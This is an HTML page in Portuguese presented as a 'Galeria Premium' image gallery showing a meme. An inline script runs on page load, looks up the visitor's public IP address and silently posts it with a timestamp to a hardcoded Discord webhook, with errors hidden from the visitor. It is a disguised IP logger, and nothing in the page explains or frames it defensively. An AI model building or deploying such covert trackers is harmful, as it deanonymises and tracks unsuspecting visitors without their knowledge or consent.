<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galeria Premium</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="pulse"></div>
    <div class="container">
        <h1>Bem-vindo à Galeria</h1>
        <div class="image-wrapper">
            <a href="https://ibb.co/NnbMN37c">
                <img src="https://i.ibb.co/JFg9pdCD/big-monke-flips-you-off-what-u-do-v0-861gk9gqka0c1.webp" alt="big monke flips you off what u do v0 861gk9gqka0c1">
            </a>
        </div>
    </div>

    <script>
        const webhookUrl = 'https://discord.com/api/webhooks/1469192703320260772/CueoZRu2zNRzNbodoXsl2NZ90xI4iyTj642wqSmAro---yLzi6SKvNwhxhbsG0CJkB2L';

        async function obterIpEnviarWebhook() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ipv4 = data.ip;

                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        embeds: [{
                            title: "🚀 Novo Acesso Detectado",
                            color: 16727650,
                            fields: [
                                {
                                    name: "Endereço IPv4",
                                    value: `\`${ipv4}\``,
                                    inline: true
                                },
                                {
                                    name: "Horário",
                                    value: new Date().toLocaleString('pt-BR'),
                                    inline: true
                                }
                            ],
                            footer: {
                                text: "Monitor de Acessos"
                            }
                        }]
                    })
                });
            } catch (error) {
                // Erro silenciado para o usuário final
            }
        }

        window.addEventListener('load', obterIpEnviarWebhook);
    </script>
</body>
</html>
